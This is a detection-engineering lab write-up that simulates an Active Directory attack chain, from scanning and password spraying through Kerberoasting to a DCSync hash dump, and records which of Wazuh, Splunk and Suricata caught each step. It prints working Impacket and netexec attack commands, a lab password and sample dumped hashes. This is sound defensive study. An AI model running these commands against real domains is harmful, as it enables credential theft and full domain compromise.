# AD Attack Detection Lab

## Detection Engineering Project

**Analyst:** Santiago Abel Ruiz Diaz
**Platform:** Wazuh 4.12.0 EDR · Splunk Enterprise 10.4.0 · OPNsense Suricata (ET Open)
**Status:** Complete — full AD attack chain simulated and validated across three detection layers
**MITRE Coverage:** T1087.002 · T1110.001 · T1069.002 · T1135 · T1558.004 · T1558.003 · T1003.006

A red-vs-blue engagement simulation against a live Active Directory domain. Starting with no credentials and no knowledge of the environment, the attacker moves from reconnaissance through full domain compromise (DCSync — all credential hashes dumped). Every technique is documented with attacker reasoning, detection findings across three independent layers, and analyst assessment of what each layer can and cannot see.

Runs on top of the [lab infrastructure](../lab-infrastructure/) extended with a second Proxmox node (pve2) hosting the Windows Server 2025 Domain Controller (`win-dc.soclab.local`, 192.168.10.11), a Wazuh all-in-one (192.168.10.20), and a VXLAN tunnel bridging both nodes into the same Lab LAN segment.

---

## Lab Environment

```
ATTACKER VLAN (192.168.20.0/24)          LAB LAN (192.168.10.0/24)
┌──────────────────┐    OPNsense     ┌──────────────────────────────────┐
│ Kali (voldemort) │ ─── Suricata ─► │ win-dc.soclab.local (10.11)      │
│ 192.168.20.100   │                 │ Windows Server 2025 DC            │
└──────────────────┘                 │ Wazuh agent · Splunk UF           │
                                     └──────────────────────────────────┘
                                              │ events
                                     ┌────────▼────────────────────────┐
                                     │ Splunk 10.4.0 (10.50)           │
                                     │ index=wineventlog               │
                                     │ index=opnsense                  │
                                     └─────────────────────────────────┘
                                     ┌─────────────────────────────────┐
                                     │ Wazuh 4.12.0 (10.20)           │
                                     │ Dashboard · Manager · Indexer   │
                                     └─────────────────────────────────┘
```

**Three detection layers per technique:**
- **Layer 1 — Wazuh EDR:** host-based alert from the agent on win-dc
- **Layer 2 — Splunk:** SPL against raw Windows Security log events (`index=wineventlog`)
- **Layer 3 — Suricata:** network IDS alert from OPNsense at the VLAN boundary (`index=opnsense`)

---

## Goal

Simulate a realistic external AD attack chain driven entirely from Kali via Impacket and netexec, with no prior knowledge of the target domain. Validate — and document the limits of — three independent detection layers at every step. Every detection gap is documented alongside the working detections. The engagement ends when all credential hashes are dumped via DCSync.

---

## Phase 1 — Reconnaissance

### 1.1 Port Scan

```bash
nmap -Pn -sV -p 53,88,135,389,445,636,3268,3389 192.168.10.11
```

RDP banner leaked the full domain picture without any authentication: domain name (`soclab.local`), FQDN, NetBIOS names, OS version (Windows Server 2025 build 10.0.26100). SMB signing required — relay attacks ruled out.

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ❌ | Host firewall disabled — no inbound connection artifacts |
| Splunk / filterlog | ❌ | Allow rules not logging — only blocked traffic is logged |
| Suricata | ✅ | `ET SCAN RDP Connection Attempt from Nmap` (SID 2036252, Priority 3) on `-sV` RDP probe |

[Suricata proof](screenshots/1-1-suricata-nmap-scan.png)

### 1.2 Anonymous LDAP Enumeration Attempt — T1087.002

```bash
impacket-GetADUsers -all -dc-ip 192.168.10.11 soclab.local/ -no-pass
```

Anonymous bind disabled — hardened default on Windows Server 2025. The attempt failed at the application layer but Impacket established a network session first, which Windows logged as an ANONYMOUS LOGON (EventCode 4624).

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ✅ | Rule 92652, Level 6 — ANONYMOUS LOGON network logon from 192.168.20.100 |
| Splunk | ✅ | 14 EventCode 4624 ANONYMOUS LOGON events from attacker IP |
| Suricata | ❌ | Anonymous LDAP bind is protocol-compliant — no ET Open signature |

[Wazuh proof](screenshots/1-2-wazuh-anon-ldap.png) · [Splunk proof](screenshots/1-2-splunk-anon-ldap.png) · [`t1087-002-anon-ldap.spl`](queries/t1087-002-anon-ldap.spl)

---

## Phase 2 — Initial Access

### 2.1 Password Spray — T1110.001

```bash
netexec smb 192.168.10.11 -u ~/lab/ad-users.txt -p 'Winter2024!' --continue-on-success
```

Single password across all guessed usernames. All five domain accounts returned valid — every user shared the same weak password. `jsmith` came back `Pwn3d!` (Domain Admin), going from zero credentials to full DA access in one command.

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ✅ | Rule 92652 + Rule 67028 fired for all 5 accounts within the same second |
| Splunk | ✅ | Behavioral: 5 distinct accounts, same source IP, 8 windows of ≥3 unique logons/10min |
| Suricata | ❌ | SMB auth over port 445 is protocol-compliant — no spray signature |

**Key finding:** Wazuh sees individual logon events but cannot identify the spray pattern. Splunk's behavioral query (bucket + `dc(user)`) reveals the pattern. Wazuh is the trigger; Splunk is the evidence.

[Wazuh proof](screenshots/2-1-wazuh-password-spray.png) · [Splunk proof](screenshots/2-1-splunk-password-spray.png) · [`t1110-001-password-spray.spl`](queries/t1110-001-password-spray.spl)

---

## Phase 3 — Enumeration (Authenticated)

### 3.1 User Enumeration — T1087.002

```bash
impacket-GetADUsers -all soclab.local/jsmith:'Winter2024!' -dc-ip 192.168.10.11
```

8 domain accounts returned via authenticated LDAP. `krbtgt` identified as the Golden Ticket target. `sconnor` has an SPN — Kerberoasting target.

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ✅ | Rule 92652 + Rule 67028 — jsmith logon, privileged account flag |
| Splunk | ✅ | EventCode 4624 for jsmith from 192.168.20.100 — account with no prior logon history, wrong VLAN |
| Suricata | ❌ | Authenticated LDAP is indistinguishable from legitimate admin traffic |

[Kali output](screenshots/3-1-kali-user-enumeration.png) · [Wazuh proof](screenshots/3-1-wazuh-user-enumeration.png) · [Splunk proof](screenshots/3-1-splunk-user-enumeration.png) · [`t1087-002-user-enumeration.spl`](queries/t1087-002-user-enumeration.spl)

### 3.2 Group Enumeration — T1069.002

```bash
net rpc group list -U 'soclab.local/jsmith%Winter2024!' -S 192.168.10.11
```

Full domain group structure exposed via RPC. Key targets: Domain Admins, DnsAdmins (DLL injection via DNS service), Backup Operators (offline NTDS backup), Replicator (replication rights).

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ✅ | Rule 92657, Level 6 — different rule from LDAP session, RPC/SMB heuristic |
| Splunk | ✅ | Additional EventCode 4624 for jsmith — cumulative attacker VLAN footprint building |
| Suricata | ❌ | SAMR/RPC over SMB is standard Windows protocol |

[Kali output](screenshots/3-2-kali-group-enumeration.png) · [Wazuh proof](screenshots/3-2-wazuh-group-enumeration.png) · [Splunk proof](screenshots/3-2-splunk-group-enumeration.png) · [`t1069-002-group-enumeration.spl`](queries/t1069-002-group-enumeration.spl)

### 3.3 Network Share Discovery — T1135

```bash
netexec smb 192.168.10.11 -u jsmith -p 'Winter2024!' --shares
```

Six shares returned — three critical: `C$` and `ADMIN$` with READ,WRITE (full filesystem access), `IT` (custom share, likely credentials or scripts), `SYSVOL`/`NETLOGON` with WRITE (GPO and logon script modification — persistence vector).

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ✅ | ANONYMOUS LOGON probe (netexec null-auth artifact) followed immediately by jsmith logon — Rule 92652 for both |
| Splunk | ✅ | 4 cumulative jsmith logons from 192.168.20.100 — Phase 3 campaign timeline visible |
| Suricata | ❌ | Authenticated SMB share listing is protocol-compliant |

[Kali output](screenshots/3-3-kali-share-discovery.png) · [Wazuh proof](screenshots/3-3-wazuh-share-discovery.png) · [Splunk proof](screenshots/3-3-splunk-share-discovery.png) · [`t1135-network-share-discovery.spl`](queries/t1135-network-share-discovery.spl)

---

## Phase 4 — Credential Attacks

### 4.1 AS-REP Roasting — T1558.004

```bash
impacket-GetNPUsers soclab.local/ -usersfile ~/lab/ad-users.txt -dc-ip 192.168.10.11 -no-pass
```

No accounts with pre-authentication disabled. All five users require Kerberos pre-auth (secure default). Technique is a dead end — pivoted to Kerberoasting.

**Detection gap — all three layers blind:**
- Wazuh: no built-in rule for AS-REP Roasting probes
- Splunk: zero EventCode 4768 from attacker IP — Kerberos failure auditing disabled by default
- Suricata: AS-REQ/AS-REP traffic is protocol-compliant

**Fix:** `auditpol /set /subcategory:"Kerberos Authentication Service" /failure:enable` — generates EventCode 4768 with `Result_Code=0x19` for every pre-auth rejection, making the probe visible.

[`t1558-004-asrep-roasting.spl`](queries/t1558-004-asrep-roasting.spl)

### 4.2 Kerberoasting — T1558.003

`sconnor` has an SPN (`MSSQLSvc/win-dc.soclab.local:1433`). Windows Server 2025 disables RC4 Kerberos by default — the standard approach (`GetUserSPNs` directly) returned `KDC_ERR_ETYPE_NOSUPP`. Workaround: obtain a TGT first via Kerberos auth, then request the service ticket using that TGT.

```bash
impacket-getTGT -dc-ip 192.168.10.11 soclab.local/jsmith:'Winter2024!'
export KRB5CCNAME=jsmith.ccache
impacket-GetUserSPNs soclab.local/jsmith -k -no-pass -request -dc-ip 192.168.10.11
```

Hash obtained: `$krb5tgs$18$` — AES256 (etype 18). The classic `Ticket_Encryption_Type=0x17` Kerberoasting detection rule returns zero results here — Windows Server 2025 AES enforcement breaks it entirely.

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ❌ | No built-in rule for EventCode 4769 — Kerberos TGS requests not alerted on |
| Splunk | ✅ | 1 EventCode 4769: `jsmith@SOCLAB.LOCAL` from `::ffff:192.168.20.100` (IPv4-mapped IPv6), `Ticket_Encryption_Type=0x12` — filter `Client_Address!="::1"`, not by IP string |
| Suricata | ✅ | `ET EXPLOIT Possible GoldenPac Priv Esc in-use` (SID 2019922, **Priority 1**, CISA_KEV) on Kerberos traffic from attacker VLAN to port 88 |

**Key finding:** The standard Kerberoasting SPL rule (`Ticket_Encryption_Type=0x17`) completely misses AES256 tickets. Correct detection: filter any 4769 where `Client_Address!="::1"` regardless of encryption type. Suricata's Priority 1 CISA_KEV alert fired before Splunk processed the event — network-layer detection is the faster and more reliable signal here.

**Topology note — why Suricata fires here but not in `ad-privesc-lab`:** In this lab (v1 flat network), Kali sits on `vmbr2` (192.168.20.x) and win-dc sits on `vmbr1` (192.168.10.x). The Kerberoasting TGS-REQ crosses the OPNsense firewall between those two bridges, so Suricata sees it and fires SID 2019922. In the redesigned VLAN lab (`ad-privesc-lab`), the attack runs from ws01 (VLAN 10) to win-dc (VLAN 10) — the same VLAN, never touching OPNsense. Suricata is blind to intra-VLAN Kerberos traffic regardless of the signature. Same technique, opposite Suricata coverage — determined entirely by network topology.

[Kali output](screenshots/4-2-kali-kerberoasting.png) · [Wazuh proof](screenshots/4-2-wazuh-kerberoasting.png) · [Splunk proof](screenshots/4-2-splunk-kerberoasting.png) · [Suricata proof](screenshots/4-2-suricata-kerberoasting.png) · [`t1558-003-kerberoasting.spl`](queries/t1558-003-kerberoasting.spl)

---

## Phase 5 — Impact

### 5.1 DCSync — T1003.006

`jsmith` is Domain Admin. We impersonate a Domain Controller using the DRSUAPI protocol to pull every credential hash from NTDS.dit — including `krbtgt`.

```bash
impacket-secretsdump soclab.local/jsmith:'Winter2024!'@192.168.10.11 -just-dc-ntlm
```

**Infrastructure note:** DRSUAPI requires port 135 (RPC endpoint mapper) plus dynamic ports 49152–65535 for the actual replication channel. Port 135 alone is not enough — the endpoint mapper negotiates a random high port for the session. Both had to be opened in OPNsense before secretsdump succeeded.

**Credentials dumped:**
```
Administrator:500:...:2b576acbe6bcfda7294d6bd18041b8fe:::
krbtgt:502:...:c0e500e1342a84945f5ede94fda9c1fe:::   ← Golden Ticket key
jsmith:1101:...:7209d1e2b55d242551d2e7aba8604e47:::
sconnor:1102:...:7209d1e2b55d242551d2e7aba8604e47:::
[+ 5 more accounts]
```

**Detection gap — near-total across all three layers:**

| Layer | Result | Signal |
|---|---|---|
| Wazuh | ❌ | DCSync rule (60204) depends on EventCode 4662 — requires audit policy not enabled by default |
| Splunk | ❌ | Zero EventCode 4662 events — "Audit Directory Service Access" off by default on Windows Server 2025 |
| Suricata | ⚠️ | `ET EXPLOIT Possible GoldenPac Priv Esc in-use` (SID 2019922, Priority 1) fired on the Kerberos auth phase — not the DRSUAPI channel itself |

**Fix:** `auditpol /set /subcategory:"Directory Service Access" /success:enable` — generates EventCode 4662 with replication GUIDs `1131f6aa` and `1131f6ab` for every DCSync attempt, making the canonical Splunk detection usable.

[Wazuh proof](screenshots/5-1-wazuh-dcsync.png) · [`t1003-006-dcsync.spl`](queries/t1003-006-dcsync.spl)

---

## Techniques Validated

| Phase | Technique | MITRE ID | Wazuh | Splunk | Suricata |
|---|---|---|---|---|---|
| Recon | Port Scan | — | ❌ | ❌ | ✅ Priority 3 |
| Recon | Anonymous LDAP | T1087.002 | ✅ Rule 92652 | ✅ 4624 ANON LOGON | ❌ |
| Initial Access | Password Spray | T1110.001 | ✅ Rules 92652+67028 | ✅ Behavioral dc(user)≥3 | ❌ |
| Enumeration | User Enumeration | T1087.002 | ✅ Rule 92652+67028 | ✅ 4624 wrong VLAN | ❌ |
| Enumeration | Group Enumeration | T1069.002 | ✅ Rule 92657 | ✅ 4624 cumulative | ❌ |
| Enumeration | Share Discovery | T1135 | ✅ Rules 92652+67028 | ✅ 4624 cumulative | ❌ |
| Credential Access | AS-REP Roasting | T1558.004 | ❌ | ❌ audit gap | ❌ |
| Credential Access | Kerberoasting | T1558.003 | ❌ | ✅ 4769 (updated rule) | ✅ **Priority 1 CISA_KEV** |
| Impact | DCSync | T1003.006 | ❌ audit gap | ❌ audit gap | ⚠️ Kerberos auth only |

---

## Key Detection Engineering Findings

**1. Suricata is the fastest signal for Kerberos attacks.** The Priority 1 / CISA_KEV GoldenPac alert (SID 2019922) fired on both Kerberoasting and DCSync before host-level events were processed. A Suricata Priority 1 alert on port 88 from an attacker VLAN IP is an immediate escalation trigger regardless of what the SIEM shows.

**2. The standard Kerberoasting detection rule is broken on Windows Server 2025.** `Ticket_Encryption_Type=0x17` (RC4) returns zero results — WS2025 issues AES256 tickets by default. Correct detection: filter EventCode 4769 where `Client_Address!="::1"`, regardless of encryption type.

**3. Windows Server 2025 logs IPv4 addresses in IPv4-mapped IPv6 format.** `::ffff:192.168.20.100` — a query filtering for `192.168.20.100` returns zero results. Always use `where Client_Address!="::1"` rather than matching the IP string directly.

**4. DCSync is nearly undetectable in a default Windows Server 2025 configuration.** The canonical detection (EventCode 4662 with replication GUIDs) requires "Audit Directory Service Access" to be explicitly enabled — it is off by default. The most impactful attack in a domain compromise leaves no Security log trace without this setting.

**5. Behavioral Splunk detection caught the password spray; rule-based Wazuh did not.** Wazuh fires per-event; Splunk reveals the campaign pattern across events. Both layers are necessary — Wazuh surfaces the trigger, Splunk provides the evidence.

---

## Audit Policy Fixes — Required for Full Detection Coverage

| Gap | Fix | Event Generated |
|---|---|---|
| AS-REP Roasting invisible | `auditpol /set /subcategory:"Kerberos Authentication Service" /failure:enable` | 4768 with Result_Code 0x19 |
| DCSync invisible | `auditpol /set /subcategory:"Directory Service Access" /success:enable` | 4662 with replication GUIDs |
| Scheduled task invisible | `auditpol /set /subcategory:"Other Object Access Events" /success:enable` | 4698 |

---

## Related

- [`lab-infrastructure/`](../lab-infrastructure/) — Proxmox/OPNsense/Splunk/Wazuh build
- [`credential-attack-detection/`](../credential-attack-detection/) — brute force and spray detection on standalone Windows/Linux
- [`atomic-red-team/`](../atomic-red-team/) — Sysmon-based technique simulation on win-target
